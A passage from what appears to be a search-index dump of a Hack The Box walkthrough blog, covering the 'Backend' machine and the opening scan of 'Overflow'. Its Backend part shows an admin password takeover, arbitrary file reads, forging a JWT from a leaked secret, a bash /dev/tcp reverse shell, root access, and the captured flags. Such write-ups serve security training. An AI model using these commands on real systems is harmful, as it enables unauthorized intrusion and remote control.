\"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  And here we see the required fields: email and password. Let\u0026rsquo;s create an account:\n$ curl 10.10.11.161/api/v1/user/signup -d '{\"email\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq {}  There\u0026rsquo;s no output, but we can assume that the account has been created. Let\u0026rsquo;s try to log in:\n$ curl 10.10.11.161/api/v1/user/login -d '{\"email\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"username\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { \"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  This error tells us that email should be replaced by username. But it doesn\u0026rsquo;t work either:\n$ curl 10.10.11.161/api/v1/user/login -d '{\"username\":\"7rocky@htb.local\",\"password\":\"asdffdsa\"}'' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"username\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { \"loc\": [ \"body\", \"password\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  Let\u0026rsquo;s change the body format to application/x-www-form-urlencoded (the default format in curl):\n$ curl 10.10.11.161/api/v1/user/login -sd 'username=7rocky@htb.local\u0026password=asdffdsa' | jq { \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg\", \"token_type\": \"bearer\" }  And there we have our JWT token. Let\u0026rsquo;s decode it in jwt.io:\nThere is a key named is_superuser, which is false. It seems clear that we need to generate a token that has is_superuser set to true.\nReading the documentation Let\u0026rsquo;s try to access the /docs endpoint providing the token:\n$ curl 10.10.11.161/docs -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg' \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link type=\"text/css\" rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css\"\u0026gt; \u0026lt;link rel=\"shortcut icon\" href=\"https://fastapi.tiangolo.com/img/favicon.png\"\u0026gt; \u0026lt;title\u0026gt;docs\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\"swagger-ui\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\"https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- `SwaggerUIBundle` is now available on the page --\u0026gt; \u0026lt;script\u0026gt; const ui = SwaggerUIBundle({ url: '/openapi.json', \"dom_id\": \"#swagger-ui\", \"layout\": \"BaseLayout\", \"deepLinking\": true, \"showExtensions\": true, \"showCommonExtensions\": true, presets: [ SwaggerUIBundle.presets.apis, SwaggerUIBundle.SwaggerUIStandalonePreset ], }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  To view this response in the browser, we can use Burp Suite to intercept the request, set the Authorization header and render the response in Burp Suite (Repeater):\nThere is an error requesting openapi.json because the Authorization header is not set for that single request. Instead, we can download it using curl:\n$ curl 10.10.11.161/openapi.json -o openapi.json -sH 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg'  And then import it in Swagger:\nAnd these are all the available endpoints:\nAt this point, we can get the user.txt flag performing a PUT request to /api/v1/user/SecretFlagEndpoint:\n$ curl -X PUT 10.10.11.161/api/v1/user/SecretFlagEndpoint {\"user.txt\":\"50b343d5b2d4d836abdc7320b87ee384\"}  Foothold There is an endpoint /api/v1/user/updatepass that needs only a few parameters:\nGetting a privileged user Only the guid and the new password (password). Maybe we are able to change the password for user admin (its guid is 36c2e94a-4271-4259-93bf-c96ad5948284):\n$ curl -s 10.10.11.161/api/v1/user/1 | jq { \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"date\": null, \"time_created\": 1649533388111, \"is_superuser\": true, \"id\": 1 } $ curl 10.10.11.161/api/v1/user/updatepass -d '{\"guid\":\"36c2e94a-4271-4259-93bf-c96ad5948284\",\"password\":\"asdffdsa\"}' -sH 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjE0YWFhNmRlLTJkMDktNDRiZi1iZDRjLTQ1OTU1MzFhNzIxMiJ9.6Utga3uFcK8GO8oAX81jC2mrFZEal9QoyhH1OJMPYfg' | jq { \"date\": null, \"id\": 1, \"is_superuser\": true, \"hashed_password\": \"$2b$12$Fqdwt6M5VTxcCM3VSxctwe3o5IUhuWSnSeOHvxNd8GPgUxzW1XoqS\", \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"time_created\": 1649533388111, \"last_update\": null }  And now we can log in as admin, we have its JWT token:\n$ curl 10.10.11.161/api/v1/user/login -sd 'username=admin@htb.local\u0026password=asdffdsa' | jq { \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw\", \"token_type\": \"bearer\" }  There is an endpoint that allows privileged users to execute commands:\nLet\u0026rsquo;s try then:\n$ curl 10.10.11.161/api/v1/admin/exec/whoami -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' {\"detail\":\"Debug key missing from JWT\"}  But we are not allowed yet, we need to add a debug key in the JWT token to enable command execution.\nReading files from the server There is another interesting endpoint that allows us to read files from the server (we saw it before with ffuf):\nThis is /etc/passwd:\n$ curl 10.10.11.161/api/v1/admin/file -d '{\"file\":\"/etc/passwd\"}' -H 'Content-Type: application/json' -sH 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' {\"file\":\"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\\npollinate:x:110:1::/var/cache/pollinate:/bin/false\\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\\n\"}  We can put the JWT token into a variable and use jq to extract the contents of the requested file, for convenience:\n$ token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjg0MDU2LCJpYXQiOjE2NDk5OTI4NTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.P6m26MR7TVwHLU2dgH4v4UA3L-6z0Mrc_3eMz-Ggcvw' $ curl 10.10.11.161/api/v1/admin/file -d '{\"file\":\"/etc/passwd\"}' -H 'Content-Type: application/json' -sH \"Authorization: Bearer $token\" | jq -r .file root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin htb:x:1000:1000:htb:/home/htb:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  Furthermore, we can create a Bash function called get_file that takes a file path and prints its contents:\n$ function get_file() { curl 10.10.11.161/api/v1/admin/file -d \"{\\\"file\\\":\\\"$1\\\"}\" -H 'Content-Type: application/json' -sH \"Authorization: Bearer $token\" | jq -r .file 2\u0026gt;/dev/null; }  Here we have user.txt again:\n$ get_file /home/htb/user.txt 50b343d5b2d4d836abdc7320b87ee384  There is no SSH private key available:\n$ get_file /home/htb/.ssh/id_rsa Internal Server Error  At this point, we need to find the source code for the API. Since we han read arbitrary files from the server, we can enumerate how processes are being run in /proc/\u0026lt;PID\u0026gt;/cmdline, so let\u0026rsquo;s enumerate some:\n$ for i in {1..1000}; do echo -n \"$i: \"; get_file /proc/$i/cmdline; echo; done | grep -a ': .' | grep -av Error 1: /sbin/initmaybe-ubiquity 478: /lib/systemd/systemd-journald 506: /lib/systemd/systemd-udevd 508: /lib/systemd/systemd-networkd 591: /sbin/multipathd-d-s 592: /sbin/multipathd-d-s 593: /sbin/multipathd-d-s 594: /sbin/multipathd-d-s 595: /sbin/multipathd-d-s 596: /sbin/multipathd-d-s 597: /sbin/multipathd-d-s 610: /lib/systemd/systemd-timesyncd 622: /usr/bin/VGAuthService 625: /usr/bin/vmtoolsd 644: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 645: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 646: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 647: /sbin/dhclient-1-4-v-i-pf/run/dhclient.ens160.pid-lf/var/lib/dhcp/dhclient.ens160.leases-I-df/var/lib/dhcp/dhclient6.ens160.leasesens160 649: /usr/lib/accountsservice/accounts-daemon 650: /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only 655: /usr/lib/accountsservice/accounts-daemon 658: /usr/sbin/irqbalance--foreground 659: /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers 660: /usr/lib/policykit-1/polkitd--no-debug 661: /usr/sbin/rsyslogd-n-iNONE 663: /usr/lib/policykit-1/polkitd--no-debug 666: /lib/systemd/systemd-logind 667: /usr/sbin/irqbalance--foreground 668: /usr/lib/udisks2/udisksd 669: /usr/sbin/runuser-uhtb--/home/htb/uhc/run.sh 673: /usr/sbin/rsyslogd-n-iNONE 674: /usr/sbin/rsyslogd-n-iNONE 675: /usr/sbin/rsyslogd-n-iNONE 688: /usr/lib/udisks2/udisksd 691: /home/htb/uhc/.venv/bin/python3/home/htb/uhc/.venv/bin/uvicorn--reload--host0.0.0.0--port80app.main:app 697: /usr/lib/policykit-1/polkitd--no-debug 698: /usr/lib/accountsservice/accounts-daemon 699: /usr/lib/udisks2/udisksd 702: /usr/sbin/ModemManager 708: /usr/bin/vmtoolsd 709: /usr/bin/vmtoolsd 712: /usr/lib/udisks2/udisksd 715: /usr/sbin/ModemManager 719: /usr/sbin/ModemManager 720: /usr/lib/udisks2/udisksd 725: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.resource_tracker import main;main(4) 726: /home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)--multiprocessing-fork 727: /lib/systemd/systemd-timesyncd 729: /usr/bin/vmtoolsd 796: /lib/systemd/systemd-resolved 837: /usr/sbin/cron-f 841: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal 842: /usr/sbin/atd-f 843: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 854: /sbin/agetty-o-p -- \\u--nocleartty1linux 857: /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal  Here we find some interesting commands. We must parse them (there are null bytes, so we must replace them with whitespaces):\n669: /usr/sbin/runuser -u htb -- /home/htb/uhc/run.sh 691: /home/htb/uhc/.venv/bin/python3 /home/htb/uhc/.venv/bin/uvicorn --reload --host 0.0.0.0 --port 80 app.main:app 725: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.resource_tracker import main;main(4) 726: /home/htb/uhc/.venv/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork  In fact, the important one is process with PID 669, which is running a shell script /home/htb/uhc/run.sh:\n$ get_file /home/htb/uhc/run.sh  #!/bin/bash cd /home/htb/uhc source .venv/bin/activate export APP_MODULE=${APP_MODULE-app.main:app} export HOST=${HOST:-0.0.0.0} export PORT=${PORT:-80} python3 populateauth.py exec uvicorn --reload --host $HOST --port $PORT \"$APP_MODULE\"  This can be a bit confusing, because there is no clear Python script being executed by uvicorn (which is a Python framework). There is a reference to a module called app.main. In Python, this is translated into app/main.py:\n$ get_file /home/htb/uhc/app/main.py  # ... from app.schemas.user import User from app.api.v1.api import api_router from app.core.config import settings from app import deps from app import crud app = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None) root_router = APIRouter(default_response_class=UJSONResponse) @app.get(\"/\", status_code=200) def root(): \"\"\" Root GET \"\"\" return {\"msg\": \"UHC API Version 1.0\"} @app.get(\"/api\", status_code=200) def list_versions(): \"\"\" Versions \"\"\" return {\"endpoints\":[\"v1\"]} @app.get(\"/api/v1\", status_code=200) def list_endpoints_v1(): \"\"\" Version 1 Endpoints \"\"\" return {\"endpoints\":[\"user\", \"admin\"]} @app.get(\"/docs\") async def get_documentation( current_user: User = Depends(deps.parse_token) ): return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\") @app.get(\"/openapi.json\") async def openapi( current_user: User = Depends(deps.parse_token) ): return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes) app.include_router(api_router, prefix=settings.API_V1_STR) app.include_router(root_router) def start(): import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\") if __name__ == \"__main__\": # Use this for debugging purposes only import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")  Here there is a reference to another module to import settings (here we should find the secret key for the JWT implementation). This one is called app.core.config, so the file we want to read is app/core/config.py:\n$ get_file /home/htb/uhc/app/core/config.py  from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator from typing import List, Optional, Union from enum import Enum class Settings(BaseSettings): API_V1_STR: str = \"/api/v1\" JWT_SECRET: str = \"SuperSecretSigningKey-HTB\" ALGORITHM: str = \"HS256\" # 60 minutes * 24 hours * 8 days = 8 days ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8 # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\\ # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]' BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = [] @validator(\"BACKEND_CORS_ORIGINS\", pre=True) def assemble_cors_origins(cls, v: Union[str, List[str]]) -\u0026gt; Union[List[str], str]: if isinstance(v, str) and not v.startswith(\"[\"): return [i.strip() for i in v.split(\",\")] elif isinstance(v, (list, str)): return v raise ValueError(v) SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\" FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\" class Config: case_sensitive = True settings = Settings()  And there we have the key used to sign the JWT tokens (SuperSecretSigningKey-HTB). Now we can modify the previous token we had and set is_superuser to true and add debug using jwt.io:\nWe can execute commands using this token:\n$ curl '10.10.11.161/api/v1/admin/exec/whoami' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A' \"htb\"  In order to use whitespaces, we must use URL encoding (%20):\n$ curl '10.10.11.161/api/v1/admin/exec/uname%20-a' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A' \"Linux Backend 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\"  Getting a reverse shell So let\u0026rsquo;s get a reverse shell on the machine:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl $(sed 's/ /%20/g' \u0026lt;\u0026lt;\u0026lt; '10.10.11.161/api/v1/admin/exec/echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash') -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNjgwMzMzLCJpYXQiOjE2NDk5ODkxMzMsInN1YiI6IjE1IiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMTRhYWE2ZGUtMmQwOS00NGJmLWJkNGMtNDU5NTUzMWE3MjEyIiwiZGVidWciOnRydWV9.SDcrNRgb2R7ojSUmAwzRFsO-_UTVgIQAZOEyLfgU98A'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.161. Ncat: Connection from 10.10.11.161:37026. bash: cannot set terminal process group (669): Inappropriate ioctl for device bash: no job control in this shell htb@Backend:~/uhc$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null htb@Backend:~/uhc$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm htb@Backend:~/uhc$ export TERM=xterm htb@Backend:~/uhc$ export SHELL=bash htb@Backend:~/uhc$ stty rows 50 columns 158  System enumeration At the current working directory we have these files:\nhtb@Backend:~/uhc$ ls -la total 80 drwxrwxr-x 1 htb htb 296 Apr 15 03:56 . drwxr-xr-x 1 htb htb 192 Apr 15 03:56 .. drwxrwxr-x 1 htb htb 138 Apr 6 13:27 .git -rw-rw-r-- 1 htb htb 18 Apr 6 13:27 .gitignore drwxr-xr-x 1 htb htb 66 Apr 9 15:10 .venv drwxr-xr-x 1 htb htb 54 Apr 10 00:59 __pycache__ drwxrwxr-x 1 htb htb 90 Apr 6 14:43 alembic -rwxrwxr-x 1 htb htb 1592 Apr 6 13:27 alembic.ini drwxrwxr-x 1 htb htb 218 Apr 10 01:02 app -rw-r--r-- 1 htb htb 3998 Apr 15 04:08 auth.log -rwxrwxr-x 1 htb htb 127 Apr 6 18:31 builddb.sh -rw-rw-r-- 1 htb htb 19353 Apr 6 13:27 poetry.lock -rw-rw-r-- 1 htb htb 2750 Apr 10 01:36 populateauth.py -rwxrwxr-x 1 htb htb 171 Apr 6 13:27 prestart.sh -rw-rw-r-- 1 htb htb 332 Apr 6 13:27 pyproject.toml -rw-rw-r-- 1 htb htb 118 Apr 9 15:10 requirements.txt -rwxrwxr-x 1 htb htb 241 Apr 10 01:02 run.sh -rw-r--r-- 1 htb htb 24576 Apr 15 03:49 uhc.db  If we check auth.log, we see some events from admin@htb.local, and a strange value Tr0ub4dor\u0026amp;3:\nhtb@Backend:~/uhc$ head -15 auth.log 04/14/2022, 07:16:39 - Login Success for admin@htb.local 04/14/2022, 07:19:59 - Login Success for admin@htb.local 04/14/2022, 07:33:19 - Login Success for admin@htb.local 04/14/2022, 07:36:39 - Login Success for admin@htb.local 04/14/2022, 07:41:39 - Login Success for admin@htb.local 04/14/2022, 07:44:59 - Login Success for admin@htb.local 04/14/2022, 07:58:19 - Login Success for admin@htb.local 04/14/2022, 08:06:39 - Login Success for admin@htb.local 04/14/2022, 08:08:19 - Login Success for admin@htb.local 04/14/2022, 08:14:59 - Login Success for admin@htb.local 04/14/2022, 08:23:19 - Login Failure for Tr0ub4dor\u00263 04/14/2022, 08:24:54 - Login Success for admin@htb.local 04/14/2022, 08:24:59 - Login Success for admin@htb.local 04/14/2022, 08:25:19 - Login Success for admin@htb.local 04/14/2022, 08:26:39 - Login Success for admin@htb.local  The user htb belongs to groups sudo and lxd, which can be useful to escalate privileges:\nhtb@Backend:~/uhc$ id uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  Privilege escalation We can try to use this strange value as the password for htb (to gain root privileges using sudo):\nhtb@Backend:~/uhc$ sudo su [sudo] password for htb: Sorry, try again. [sudo] password for htb: sudo: 1 incorrect password attempt  It doesn\u0026rsquo;t work, but it does for root:\nhtb@Backend:~/uhc$ su root Password: root@Backend:/home/htb/uhc# cat /root/root.txt 6ec23ed1654a955109e42bb23d730973  ","image":"/images/HTB/Backend/Backend.png","permalink":"https://7rocky.github.io/en/htb/backend/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has an API where we can create a new account after some exploration. Then we can find some documentation in Swagger format where we see an endpoint to execute commands and to read files from the server. We must find the secret key used to sign JWT tokens in order to create a valid token to execute commands. Knowledge on JWT tokens and API enumeration are needed to compromise this machine","time":13,"title":"Backend"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.11.119   Release: 23 / 10 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.119 -p 22,25,80 Nmap scan report for 10.10.11.119 Host is up (0.046s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA) | 256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA) |_ 256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Overflow Sec |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: Host: overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 42.40 seconds  This machine has ports 22 (SSH), 25 (SMTP) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.119 we will see a page like this:\nAt the footer we see Overflow.HTB. Just in 